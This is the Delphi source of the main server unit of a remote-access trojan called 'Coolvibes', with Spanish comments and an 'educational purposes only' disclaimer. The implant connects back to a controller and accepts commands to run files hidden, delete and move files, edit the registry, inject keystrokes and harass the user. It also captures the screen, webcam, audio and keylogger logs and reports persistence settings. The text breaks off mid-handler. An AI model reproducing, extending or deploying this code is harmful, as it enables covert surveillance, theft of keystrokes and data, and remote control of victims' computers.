{Unit principal del Server del troyano Coolvibes}

(* Este c�digo fuente se ofrece s�lo con fines educativos.
   Queda absolutamente prohibido ejecutarlo en computadores
   cuyo due�o sea una persona diferente de usted, a no ser
   que el due�o haya dado permiso explicito de usarlo.

   En cualquier caso, ni www.indetectables.net  ni ninguno de
   los creadores de Coolvibes ser� responsable de cualquier
   consecuencia de usar este programa. Si no acepta esto por
   favor no compile el programa y borrelo ahora mismo.

     El equipo Coolvibes
*)

//Config del release
{$define CommDebug}
{$define DevConfig}

//library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
program CoolServer; //Para debug, m�s lineas "Para debug" abajo
uses
  Windows,
  SysUtils,
  ShellAPI,
  Classes,
  MiniReg in 'MiniReg.pas',
  SettingsDef in 'SettingsDef.pas',
  SndKey32 in 'SndKey32.pas',
  SocketUnit in 'SocketUnit.pas',
  UnitAudio in 'UnitAudio.pas',
  UnitAvs in 'UnitAvs.pas',
  UnitBromas in 'UnitBromas.pas',
  UnitBuscar in 'UnitBuscar.pas',
  UnitCamScreen in 'UnitCamScreen.pas',
  UnitCambioId in 'UnitCambioId.pas',
  UnitFileManager in 'UnitFileManager.pas',
  UnitFunciones in 'UnitFunciones.pas',
  UnitInstalacion in 'UnitInstalacion.pas',
  UnitKeylogger in 'UnitKeylogger.pas',
  UnitPortScan in 'UnitPortScan.pas',
  UnitProcess in 'UnitProcess.pas',
  UnitRegistro in 'UnitRegistro.pas',
  UnitServicios in 'UnitServicios.pas',
  UnitShell in 'UnitShell.pas',
  UnitSystemInfo in 'UnitSystemInfo.pas',
  UnitThreadsCapCamCapture in 'UnitThreadsCapCamCapture.pas',
  UnitTransfer in 'UnitTransfer.pas',
  UnitVariables in 'UnitVariables.pas',
  UnitWindows in 'UnitWindows.pas',
  UnitPlugins in 'UnitPlugins.pas';//,
  //ZLibEx in 'delphizlib/ZLibEx.pas',
  //ZLibExApi in 'delphizlib/ZLibExApi.pas';

var
  SH: Integer; //SocketHandle de la conexi�n principal
  RecibiendoFichero: Boolean = False;
  sock: TClientSocket;
  KeepAliveHandle: THandle;
  pingSent: Boolean;
  Busy: Boolean;
  pongReceived: Boolean;
  lastCommandTime: Integer;
  MCompartida: THandle;
  Indice: string;
  Conectando: Boolean;

const
  WM_ACTIVATE = $0006;

procedure sendText(str: AnsiString);
begin
  sock.SendString(str);
  //sock.SendString( ZCompressStr(str) );
  {$ifdef CommDebug}OutputDebugString(PChar('Server OUT: ' + str));{$endif}
end;

procedure CheckAlive();
begin
  if (sock = nil) then
    Exit;

  if (not sock.connected) or Conectando then
    begin
      //No estaba conectado asi que me salgo
      Exit;
    end;

  if ((GetTickCount() - lastCommandTime) < 40000) then
    begin
      //ShowMessage('Han pasado 40"');
      Exit;
    end;

  //No ha pasado 40 seg idle asi que no mando ping: (getTickCount - lastCommandTime)

  if not busy then
    begin
      //No estaba Busy
      if pingSent then
        begin
          //Ya habia enviado el ping
          if not pongReceived then
            begin
              //No recibi el pong asi que me voy a desconectar
              sock.Disconnect;
              //Ya me desconecte
            end
          else
            begin
              pingSent := False;
            end;
        end
      else
        begin
          //No habia mandado el ping asi que lo mando
          pingSent := True;
          pongReceived := False;
          SendText('PING' + ENTER);
          //Ya mande el ping
        end;
    end;

end;

procedure KeepAliveTimer(Interval: DWORD);
begin
  KeepAliveHandle := SetTimer(0, 0, Interval, @CheckAlive);
end;

procedure KeepAliveThread;
var
  Msg: TMsg;
begin
  //ShowMessage('Soy el keepalive thread!!');
  KeepAliveTimer(25000);
  while (GetMessage(Msg, 0, 0, 0)) do
    begin
      if ThreadStarted then
        break; //Se ha iniciado el keylogger, �l se encargar� de recibr los mensajes
      TranslateMessage(Msg);
      DispatchMessage(Msg);
    end;
  while true do sleep(1000);
end;

function leer(s: TClientSocket): AnsiString;
var
  buf: array[0..0] of char;
var
  input: AnsiString;
begin
  input := '';
  buf[0] := ' ';
  s.ReceiveBuffer(buf, SizeOf(buf));
  while ((buf[0] <> #10) and (buf[0] <> #13) and (s.Connected)) do
    begin
      input := input + buf[0];
      //input := ZDecompressStr(buf[0]);
      try
        s.ReceiveBuffer(buf, SizeOf(buf));
      except
        input := '';
        s.Destroy;
        break;
      end;
    end;
  Result := input;
  {$ifdef CommDebug}OutputDebugString(PChar('Server IN: ' + input));{$endif}
end;

procedure Iniciar();
var
  Recibido, Respuesta, TempStr, TempStr1, TempStr2, TempStr3: AnsiString;
  Tipo, BotonPulsado, i, o: Integer;
  TempCardinal: Cardinal;
  Tam: Int64;
  ShellParameters: TShellParameters;
  ThreadInfo: TThreadInfo;
  ThreadSInfo: TThreadServiciosInfo;
  FilePath, LocalFilePath: AnsiString;
  Host: string;
  Port: Integer;
  ThreadSearch: TThreadSearch;
  ThreadCapCam: TThreadCapCam;
  capiniciadam, bool: Boolean;
  MS: TMemoryStream;
  ExitCode: Longword;
  DesinstalarServer : boolean;
  buf: array[0..0] of char;
begin
  DesinstalarServer := false;
  try
    begin
      sock := TClientSocket.Create; //Socket principal
      if indice = '' then
        indice := configuracion.shosts;
      host := Copy(indice, 1, Pos(':', indice) - 1); // Se leen el host y el port de la lista almacenada en indice en el formato: ip:puerto�ip2:puerto2�ip3:puerto3�
      Delete(indice, 1, Pos(':', indice));
      Port := StrToIntDef(Copy(indice, 1, Pos('�', indice) - 1), 80);
      Delete(indice, 1, Pos('�', indice));
      Pararcapturathread := True;
      Conectando := True;
      sock.Connect(host, port);
      Conectando := False;
      lastCommandTime := GetTickCount;

      while sock.Connected do
        begin
          Recibido := Trim(leer(sock)); //Asignamos la informaci�n recibida del Cliente al string Recibido

          Busy := True;

          if Recibido = 'PING' then //Si recibimos 'PING' del Cliente entonces
            begin
              //Enviamos informaci�n para que actualice el ListViewConexiones
              Respuesta := GetActiveWindowCaption() + '|' +
                            GetIdleTime() + '|' +
                            GetUptime() + '|'; 
              //SendText env�a la informaci�n al Cliente
              //  SendText(String)
              SendText('PONG|' + Respuesta + ENTER); //Enviamos 'PONG' al Cliente para que se entere
            end;

          if Recibido = 'PONG' then
            begin
              pongReceived := True;
            end;

          //Informaci�n mostrada en el ListView de conexiones del cliente, se recibe tambien
          //el SocketHandle del cliente, que lo usaremos para relaccionar la conexi�n principal
          //con la conexi�n para enviar y recibir ficheros

          //Copy copia la informaci�n del string recibido del Cliente:
          //  Copy(String, Posici�n, N�_Caracteres)
          if Copy(Recibido, 1, 8) = 'MAININFO' then
            begin
              //Delete borra la informaci�n del string recibido del Cliente:
              //  Delete(String, Posici�n, N�_Caracteres)
              Delete(Recibido, 1, 9); //Borramos 'MAININFO|'
              SH := StrToIntDef(Recibido, -1); //Para no romper el server en caso de que un usuario malintencionado nos mande un MAININFO corrupto
              if SH = -1 then break;
              Respuesta :=
                LeerID() + '|' + Sock.LocalAddress + '|' + GetCPU() + '|' +
                GetOS() + '|' + VersionDelServer + '|1|' + GetActiveWindowCaption() + '|' +
                GetIdleTime() + '|' + GetUptime() + '|' + GetIdioma() + '|' + GetPcUser() + '/' + GetPCName() + '|';
              {no cambiar este slash}
              SendText('MAININFO|' + Respuesta + ENTER);
            end;

          //Informaci�n mas extendida del sistema
          if Recibido = 'INFO' then
            begin
              Respuesta := GetOS() + '|' + GetCPU() +
                '|' + GetUptime() + '|' + GetIdleTime() +
                '|' + ObtenerAvs() + '|' + ObtenerFirewall +
                '|' + GetPCName() + '|' + GetPCUser() +
                '|' + GetResolucion() + '|' + GetTamanioDiscos() + '|';
              SendText('INFO|' + Respuesta + ENTER);
            end;

          //Comandos relacionados con la gesti�n del servidor
          if Copy(Recibido, 1, 8) = 'SERVIDOR' then
            begin
              Delete(Recibido, 1, 9);
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Saca el comando
              Delete(Recibido, 1, Pos('|', Recibido));
              //Informaci�n espec�fica del servidor
              if TempStr = 'INFO' then
                begin
                  with Configuracion do
                    TempStr := VersionDelServer + '|' + sID +
                      '|' + sHosts + '|' +
                      BooleanToStr(bCopiarArchivo, 'S�', 'No') + '|' +
                      sFileNameToCopy + '|' + sCopyTo +
                      '|' + BooleanToStr(bMelt, 'S�', 'No') + '|' +
                      BooleanToStr(bCopiarConFechaAnterior, 'S�', 'No') +
                      '|' + BooleanToStr(bArranqueRun, 'S�', 'No') +
                      '|' + sRunRegKeyName + '|' + BooleanToStr(bArranqueActiveSetup, 'S�', 'No') +
                      '|' + sActiveSetupKeyName + '|' + ParamStr(0) + '|';
                  SendText('SERVIDOR|INFO|' + TempStr + ENTER);
                end;

              //Cerrar server
              if TempStr = 'CERRAR' then
                begin
                  //SendText('MSG|Adi�s!');
                  //Halt;
                  DesactivarWebcams();
                  if ShellThreadID <> 0 then
                    PostThreadMessage(ShellThreadID, WM_ACTIVATE, Length('exit'),DWord(PChar('exit')));
                  sleep(1000);
                  ExitProcess(0);
                end;

              //Desinstalar server
              if TempStr = 'DESINSTALAR' then
                begin
                  SendText('MSG|{0}' + ENTER);
                  DesinstalarServer := true;
                  Sock.disconnect; //Para que realice las acciones de desconexi�n antes de desinstalarse
                end;

              if TempStr = 'ACTUALIZAR' then
                begin
                  Borrararchivo(extractfilepath(ParamStr(0)) + Configuracion.sPluginName);
                  if ShellExecute(0, 'open', PChar(ParamStr(0)), '' {sin parametros},
                    PChar(ExtractFilePath(ParamStr(0))), SW_NORMAL) > 32 then
                    begin
                      if ShellThreadID <> 0 then
                        PostThreadMessage(ShellThreadID, WM_ACTIVATE, Length('exit'),
                      DWord(PChar('exit')));
                      DesactivarWebcams();
                      sleep(1000);
                      ExitProcess(0);
                    end
                  else
                    SendText('MSG|{1}' + ENTER);
                end;
            end;

          //Comandos relaccionados con los procesos
          if Recibido = 'PROC' then //Listar los procesos
            begin
              Respuesta := GetProc();
              SendText('PROC|' + Respuesta + ENTER);
            end;

          {Si los primeros ocho caracteres son 'KILLPROC', significa que hay que matar
          un proceso. Saca el PID y mata ese proceso. Sintaxis del comando: KILLPROC|<PID>}
          if Copy(Recibido, 1, 8) = 'KILLPROC' then
            begin
              Delete(Recibido, 1, 9);
              if TerminarProceso(Recibido) = True then
                SendText('MSG|{2}' + Recibido + ENTER)
              else
                SendText('MSG|{3}' + Recibido + ENTER);
            end;
          //Fin de comandos relaccionados con los procesos

          //Comandos relaccionados con las ventanas
          if Copy(Recibido, 1, 4) = 'WIND' then //Listar ventanas
            begin
              Delete(Recibido, 1, 5);

              Respuesta := '';
              if (Copy(Recibido, 1, 4) = 'true') then
                Respuesta := GetWins(True)
              else
                Respuesta := GetWins(False);
              SendText('WIND|' + Respuesta + ENTER);
            end;

          if Copy(Recibido, 1, 7) = 'WINPROC' then
            //Sintaxis: WINDPROC|Handle //Env�a el PID del proceso padre de la ventana con Handle
            begin
              Delete(Recibido, 1, 8);
              TempCardinal := 0;
              GetWindowThreadProcessID(StrToInt(Recibido), TempCardinal);
              //WINDPROC|HandleDeLaVentana|ProcessID
              SendText('WINPROC|' + Recibido + '|' + IntToStr(TempCardinal) + ENTER);
            end;

          if Copy(Recibido, 1, 8) = 'CLOSEWIN' then
            begin
              Delete(Recibido, 1, 9);
              CerrarVentana(StrToInt(Recibido));
              SendText('MSG|{4}' + Recibido + ENTER);
            end;

          if Copy(Recibido, 1, 6) = 'MAXWIN' then
            begin
              Delete(Recibido, 1, 7);
              MaximizarVentana(StrToInt(Recibido));
              SendText('MSG|{5}' + Recibido + ENTER);
            end;

          if Copy(Recibido, 1, 6) = 'MINWIN' then
            begin
              Delete(Recibido, 1, 7);
              MinimizarVentana(StrToInt(Recibido));
              SendText('MSG|{6}' + Recibido + ENTER);
            end;

          if Copy(Recibido, 1, 7) = 'SHOWWIN' then
            begin
              Delete(Recibido, 1, 8);
              MostrarVentana(StrToInt(Recibido));
              SendText('MSG|{7}' + Recibido + ENTER);
            end;

          if Copy(Recibido, 1, 7) = 'HIDEWIN' then
            begin
              Delete(Recibido, 1, 8);
              OcultarVentana(StrToInt(Recibido));
              SendText('MSG|{8}' + Recibido + ENTER);
            end;

          if Recibido = 'MINALLWIN' then
            begin
              MinimizarTodas();
              SendText('MSG|{9}' + ENTER);
            end;

          if Copy(Recibido, 1, 11) = 'BOTONCERRAR' then
            begin
              Delete(Recibido, 1, 12);
              if Copy(Recibido, 1, 2) = 'SI' then
                begin
                  Delete(Recibido, 1, 3); //Borra 'SI|' y queda el handle
                  BotonCerrar(True, StrToInt(Recibido));
                  SendText('MSG|{10}' +
                    Recibido + ENTER);
                end
              else
                begin
                  Delete(Recibido, 1, 3); //Borra 'NO|' y queda el handle
                  BotonCerrar(False, StrToInt(Recibido));
                  SendText('MSG|{11}' +
                    Recibido + ENTER);
                end;
            end;

          if Copy(Recibido, 1, 8) = 'SENDKEYS' then
            begin
              Delete(Recibido, 1, 9);
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              //Copia el handle de la ventana...
              Delete(Recibido, 1, Pos('|', Recibido)); //borra el handle + '|'
              try
                i := StrToInt(TempStr)
              except
                begin
                  SendText('MSG|{12}' +
                    TempStr + ENTER);
                  Exit;
                end;
              end;
              AppActivateHandle(i);
              SendKeys(PChar(Recibido), True);
              SendText('MSG|{13}' + TempStr + ENTER);
            end;
          //Fin de comandos relacionados con las ventanas

          //Comandos relaccionados con las bromas
          if Copy(Recibido, 1, 15) = 'MOUSETEMBLOROSO' then
            begin
              Delete(Recibido, 1, 16); //Borra 'MOUSETEMBLOROSO|' de la cadena
              if Recibido = 'ACTIVAR' then
                begin
                  //activar mouse tembloroso
                  CongelarMouse(False); //Lo descongela si est� congelado
                  TemblarMouse(True);
                  SendText('MOUSETEMBLOROSO|Activado' + ENTER);
                end
              else
                begin
                  //desactivar mouse tembloroso
                  TemblarMouse(False);
                  SendText('MOUSETEMBLOROSO|Desactivado' + ENTER);
                end;
            end;

          if Copy(Recibido, 1, 13) = 'CONGELARMOUSE' then
            begin
              Delete(Recibido, 1, 14); //Borra 'CONGELARMOUSE|' de la cadena
              if Recibido = 'ACTIVAR' then
                begin
                  //activar congelar mouse
                  TemblarMouse(False); //El mouse para de temblar si se congela
                  CongelarMouse(True);
                  {sleep(10000); //Recomendado Para debug :p
                  CongelarMouse(False);}
                  SendText('CONGELARMOUSE|Activado' + ENTER);
                end
              else
                begin
                  //desactivar congelar mouse
                  CongelarMouse(False);
                  SendText('CONGELARMOUSE|Desactivado' + ENTER);
                end;
            end;

          if Copy(Recibido, 1, 7) = 'ABRIRCD' then
            begin
              Delete(Recibido, 1, 8); //Borra 'ABRIRCD|' de la cadena
              if Recibido = 'ACTIVAR' then
                begin
                  //abrir cd
                  mciSendString('Set cdaudio door open wait', nil, 0, hInstance);
                  SendText('ABRIRCD|Activado' + ENTER);
                end
              else
                begin
                  //cerrar cd
                  mciSendString('Set cdaudio door closed wait', nil, 0, hInstance);
                  SendText('ABRIRCD|Desactivado' + ENTER);
                end;
            end;

          if Copy(Recibido, 1, 16) = 'MATARBOTONINICIO' then
            begin
              Delete(Recibido, 1, 17); //Borra 'MATARBOTONINICIO|' de la cadena
              if Recibido = 'ACTIVAR' then
                begin
                  //Desactivar boton inicio
                  EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil)
                    , 0, 'Button', nil), False);
                  SendText('MATARBOTONINICIO|Activado' + ENTER);
                end
              else
                begin
                  //Activar boton inicio
                  EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil)
                    , 0, 'Button', nil), True);
                  SendText('MATARBOTONINICIO|Desactivado' + ENTER);
                end;
            end;
          //Fin de comandos relaccionados con las bromas

          //Comandos relaccionados con los mensajes
          if Copy(Recibido, 1, 4) = 'MSJN' then
            begin
              Delete(Recibido, 1, 4);
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Obtenemos el mensaje
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Obtenemos el titulo
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Tipo de mensaje
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr3 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              //Obtenemos los botones del mensaje

              Tipo := 0;
              //Miramos el tipo de mensaje
              if TempStr2 = 'WARN' then
                Tipo := MB_ICONERROR;
              if TempStr2 = 'QUES' then
                Tipo := MB_ICONQUESTION;
              if TempStr2 = 'EXCL' then
                Tipo := MB_ICONEXCLAMATION;
              if TempStr2 = 'INFO' then
                Tipo := MB_ICONINFORMATION;

              case StrToInt(TempStr3) of //Lo transformamos en entero para poder usar el case
                0: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_OK);
                1: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                    Tipo + MB_OKCANCEL);
                2: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                    Tipo + MB_RETRYCANCEl);
                3: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_YESNO);
                4: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                    Tipo + MB_YESNOCANCEL);
                5: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                    Tipo + MB_ABORTRETRYIGNORE);
                else
                  BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_OK);
                  //nunca deber�a pasar pero es mejor prevenir
              end;
              case BotonPulsado of
                idOk: SendText('MSG|{14}' + ENTER);
                idCancel: SendText('MSG|{15}' + ENTER);
                idRetry: SendText('MSG|{16}' + ENTER);
                idYes: SendText('MSG|{17}' + ENTER);
                idNo: SendText('MSG|{18}' + ENTER);
                idAbort: SendText('MSG|{19}' + ENTER);
                idIgnore: SendText('MSG|{20}' + ENTER);
              end;
            end;
          //Fin de comandos relacionados con los Mensajes

          //Comandos relacionados con el FileManager
          if Recibido = 'VERUNIDADES' then
            begin
              TempStr := '';
              TempStr := GetDrives(Tam);
              SendText('VERUNIDADES|' + TempStr + ENTER);
            end;
          //Listar archivos dentro de un directorio
          if Copy(Recibido, 1, 14) = 'LISTARARCHIVOS' then
            begin
              Delete(Recibido, 1, 15);
              if Copy(GetDirectory(Recibido), 1, 4) = 'MSG|' then
                begin
                  //Diga que no existe el directorio asignado y salte...
                  SendText(GetDirectory(Recibido) + ENTER);
                  //Exit;
                end
              else
                begin
                  TempStr := GetDirectory(Recibido);
                  SendText('LISTARARCHIVOS|' + IntToStr(Length(TempStr)) + '|' + TempStr + ENTER);
                end;
            end;

          //Ejecutar Archivo...
          if Copy(Recibido, 1, 4) = 'EXEC' then
            begin
              Delete(Recibido, 1, 5); //Borra 'EXEC|'
              if Copy(Recibido, 1, 6) = 'NORMAL' then
                begin
                  Delete(Recibido, 1, 7); //Borra 'NORMAL|'
                  //Ejecutar en modo normal el archivo que queda en Recibido
                  //If the function ShellExecute fails, the return value is an error value that is less than or equal to 32
                  if ShellExecute(0, 'open', PChar(Recibido), '' {sin parametros},
                    PChar(ExtractFilePath(Recibido)), SW_NORMAL) > 32 then
                    SendText('MSG|{21}' + ENTER)
                  else
                    SendText('MSG|{22}' + ENTER);
                end; //if copy = normal
              if Copy(Recibido, 1, 6) = 'OCULTO' then
                begin
                  Delete(Recibido, 1, 7); //Borra 'OCULTO|'
                  //Ejecutar en modo oculto el archivo que queda en Recibido
                  //If the function ShellExecute fails, the return value is an error value that is less than or equal to 32
                  if ShellExecute(0, 'open', PChar(Recibido), '' {sin parametros},
                    PChar(ExtractFilePath(Recibido)), SW_HIDE) > 32 then
                    SendText('MSG|{23}' + ENTER)
                  else
                    SendText('MSG|{24}'
                      + ENTER);
                end; //if copy = oculto
            end; //if copy = exec

          //Borrar archivo
          if Copy(Recibido, 1, 7) = 'DELFILE' then
            begin
              Delete(Recibido, 1, 8); //Borra 'DELFILE|'
              if FileExists(Recibido) then
                begin
                  if BorrarArchivo(Recibido) = True then
                    SendText('MSG|{25}' + ENTER)
                  else
                    SendText('MSG|{26}' + ENTER);
                end
              else //el archivo no existe.... Se supone que nunca o muy pocas veces deber�a pasar.
                SendText('MSG|{27}' + ENTER);

            end;

          //Borrar carpeta
          if Copy(Recibido, 1, 9) = 'DELFOLDER' then
            begin
              Delete(Recibido, 1, 10);
              if DirectoryExists(Recibido) then
                begin
                  if BorrarCarpeta(Recibido) = True then
                    SendText('MSG|{28}' + ENTER)
                  else
                    SendText('MSG|{29}' + ENTER);
                end
              else
                SendText('MSG|{30}' + ENTER);
            end;

          //Renombrar archivos o carpetas
          if Copy(Recibido, 1, 6) = 'RENAME' then
            begin
              Delete(Recibido, 1, 7);
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Saca el nombre viejo
              Delete(Recibido, 1, Pos('|', Recibido)); //borra lo que acaba de copiar
              if FileExists(TempStr) or DirectoryExists(TempStr) then
                begin
                  if RenameFile(TempStr, Recibido) = True then
                    SendText('MSG|{31}' + ENTER)
                  else
                    SendText('MSG|{32}' + ENTER);
                end
              else
                SendText('MSG|{33}' + ENTER); //el archivo no existe...
            end;

          //Crear carpeta
          if Copy(Recibido, 1, 5) = 'MKDIR' then
            begin
              Delete(Recibido, 1, 6);
              if not DirectoryExists(Recibido) then
                begin
                  if CreateDir(Recibido) = True then
                    SendText('MSG|{34}' + ENTER)
                  else
                    SendText('MSG|{35}' + ENTER);
                end
              else
                SendText('MSG|{36}' + ENTER);
              //Ya existe una carpeta con ese nombre
            end;

          //copiar
          if Copy(Recibido, 1, 5) = 'COPYF' then
            begin
              Delete(Recibido, 1, 6);
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //desde
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //a
              if DirectoryExists((TempStr)) then
              begin
                if CopiarCarpeta(PChar(TempStr), PChar(TempStr1)) then
                  SendText('MSG|{37}' + ENTER)
                else
                  SendText('MSG|{38}' + ENTER);
              end
              else
              begin
                if copyfile(PChar(TempStr), PChar(TempStr1), False) then
                  SendText('MSG|{37}' + ENTER)
                else
                  SendText('MSG|{38}' + ENTER);
              end;
            end;

          if Copy(Recibido, 1, 4) = 'CUTF' then
            begin
              Delete(Recibido, 1, 5);
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //desde
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //a
              if DirectoryExists((TempStr)) then
              begin
                if MoverCarpeta(PChar(TempStr), PChar(TempStr1)) then
                  SendText('MSG|{56}' + ENTER)
                else
                  SendText('MSG|{57}' + ENTER);
              end
              else if FileExists(TempStr) then
              begin
                if MoverArchivo(PChar(TempStr), PChar(TempStr1)) then
                  SendText('MSG|{56}' + ENTER)
                else
                  SendText('MSG|{57}' + ENTER);
              end;
            end;
          //Cambiar atributos
          if Copy(Recibido, 1, 11) = 'CHATRIBUTOS' then
            begin
              Delete(Recibido, 1, 12);
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //dir
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //atributos
              i := 0;
              if (Pos('Oculto', tempstr1) > 0) then //Oculto
                i := i or faHidden;
              if (Pos('Lectura', tempstr1) > 0) then //lectura
                i := i or faReadOnly;
              if (Pos('Sistema', tempstr1) > 0) then //Sistema
                i := i or faSysFile;

              FileSetAttr(tempstr, i);
            end;

          //Ir a un directorio r�pidamente
          if Copy(Recibido, 1, 6) = 'GORUTA' then
            begin
              Delete(Recibido, 1, Pos('|', Recibido));

              if Recibido = 'RECIENTE' then
                Recibido := GetSpecialFolderPath($0008)
              else if Recibido = 'DOCUMENTOS' then
                Recibido := GetSpecialFolderPath($0005)
              else if Recibido = 'ESCRITORIO' then
                Recibido := GetSpecialFolderPath($0010)
              else if Recibido = 'WINDIR' then
                Recibido := WinDir
              else if Recibido = 'SYSDIR' then
                Recibido := Sysdir
              else if Recibido = 'CURRENTDIR' then
                Recibido := extractfilepath(ParamStr(0));

              Sendtext('GORUTA|' + Recibido + '|' + ENTER);
            end;

          //Fin de comandos relacionados con el FileManager

          //Comandos relacionados con el Registro
          if Copy(Recibido, 1, 12) = 'LISTARCLAVES' then
            begin
              Delete(Recibido, 1, 13);
              Tempstr := '';
              TempStr := ListarClaves(Trim(Recibido));
              SendText('LISTARCLAVES|' {+ IntToStr(length(TempStr)) + '|'} + TempStr + ENTER);
            end;

          if Copy(Recibido, 1, 13) = 'LISTARVALORES' then
            begin
              Delete(Recibido, 1, 14);
              Tempstr := '';
              Tempstr := ListarValores(Trim(Recibido));

              SendText('LISTARVALORES|' + TempStr + ENTER);
            end;

          if Copy(Recibido, 1, 14) = 'NEWNOMBREVALOR' then
            begin
              Delete(Recibido, 1, 15);
              //Extraemos la clave donde est� el valor
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
              //Obtenemos el viejo nombre del valor
              TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
              //Conseguimos el nuevo nombre del valor
              TempStr2 := Copy(Recibido, 1, Length(Recibido));
              if RenombrarClave(PChar(TempStr), PChar(TempStr1), PChar(TempStr2)) then
                SendText('MSG|{39}' + ENTER)
              else
                SendText('MSG|{40}' + ENTER);
            end;

          if Copy(Recibido, 1, 14) = 'BORRARREGISTRO' then
            begin
              Delete(Recibido, 1, 15);
              if BorraClave(Recibido) then
                SendText('MSG|{41}' + ENTER)
              else
                SendText('MSG|{42}' + ENTER);
            end;

          if Copy(Recibido, 1, 8) = 'NEWCLAVE' then
            begin
              Delete(Recibido, 1, 9);
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr1 := Copy(Recibido, 1, Length(Recibido)); //Quitamos la �ltima barra '\'
              if AniadirClave(TempStr + TempStr1, '', 'clave') then
                SendText('MSG|{43}' + ENTER)
              else
                SendText('MSG|{44}' + ENTER);
            end;

          if Copy(Recibido, 1, 8) = 'ADDVALUE' then
            begin
              Delete(Recibido, 1, 9);
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
              if AniadirClave(TempStr, Copy(Recibido, 1, Length(Recibido)), TempStr1) then
                SendText('MSG|{45}' + ENTER)
              else
                SendText('MSG|{46}' + ENTER);
            end;
          //Fin de comandos relacionados con el Registro

          if Copy(Recibido, 1, 14) = 'DATOSCAPSCREEN' then
            begin
              SendText('DATOSCAPSCREEN|' + IntToStr(anchurapantalla()) + '|' + IntToStr(alturapantalla()) + '|' + ENTER);
            end;

          //Codigo para enviar la captura de pantalla, la de webcam, los thumbnails y el keylogger, usan un socket independiente
          if (Copy(Recibido, 1, 9) = 'CAPSCREEN') or (Copy(recibido, 1, 13) = 'CAPTURAWEBCAM') or (Copy(recibido, 1, 8) = 'GETTHUMB') or (Copy(recibido, 1, 8) = 'GETAUDIO') or (Copy(recibido, 1, 16) = 'RECIBIRKEYLOGGER') then
            begin

              if Pararcapturathread then //si aun no se ha iniciado...
                begin
                  pararcapturathread := False;
                  ThreadCapCam := TThreadCapCam.Create(SH, sock); //Se crea nuevo thread
                  ThreadCapCam.Resume;
                end;
              //El thread mira el cambio de la variable global CapturaPantalla,CapturaWebcam..., quizas no sea el mejor m�todo...

              if Copy(recibido, 1, 13) = 'CAPTURAWEBCAM' then
                begin //Se crea la captura de webcam desde aqu� porque sino da error al hacer las llamadas a la dll desde el otro thread
                  Delete(Recibido, 1, Pos('|', Recibido));
                  TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Numero de webcam
                  Delete(Recibido, 1, Pos('|', Recibido));
                  MS := TMemoryStream.Create; //MS de la captura de Pantalla
                  MS.Position := 0;
                  CapturarWebcam(MS, StrToInt(TempStr), StrToInt(Recibido));
                  MS.Position := 0;
                  TempStr := '';
                  SetLength(TempStr, ms.Size);
                  Ms.read(TempStr[1], ms.Size);
                  MS.Free;
                  MS := nil;
                  CapturaWebcam := Tempstr; //Le dejamos que la envie el otro thread
                end
              else if Copy(recibido, 1, 9) = 'CAPSCREEN' then
                begin
                  Delete(Recibido, 1, Pos('|', Recibido));
                  CapturaPantalla := trim(Recibido); //Simplemente le pasamos los datos y el thread realiza la captura
                end
              else if (Copy(recibido, 1, 8) = 'GETTHUMB') then
                begin
                  Delete(Recibido, 1, Pos('|', Recibido));
                  CapturaThumb := Recibido;
                end
              else if (Copy(recibido, 1, 16) = 'RECIBIRKEYLOGGER') then
                begin
                  TempStr := '';
                  TempStr := ObtenerLog();
                  CapturaKeylogger := TempStr;
                end
              else if (Copy(recibido, 1, 8) = 'GETAUDIO') then
                begin
                  Delete(Recibido, 1, Pos('|', Recibido));
                  CapturaAudio := Recibido;
                end;

            end;
          //Fin del c�digo para capturar pantalla, webcam, thumbs y recibir keylogger

          if Copy(recibido, 1, 8) = 'CAMBIOID' then //cambiar el id
            begin
              Delete(recibido, 1, 8);
              CambiarID(trim(recibido));
            end;

          //Comandos relaccionados con la webcam
          if Copy(recibido, 1, 13) = 'LISTARWEBCAMS' then
            begin
              Tempstr := '';
              Tempstr := ListarDispositivos;
              SendText('LISTARWEBCAMS|' + Tempstr + ENTER);
            end;

          //Clics remotos
          if Copy(Recibido, 1, 6) = 'MOUSEP' then
            begin
              Delete(recibido, 1, 6);
              TempStr := Copy(recibido, 1, Pos('|', recibido) - 1);
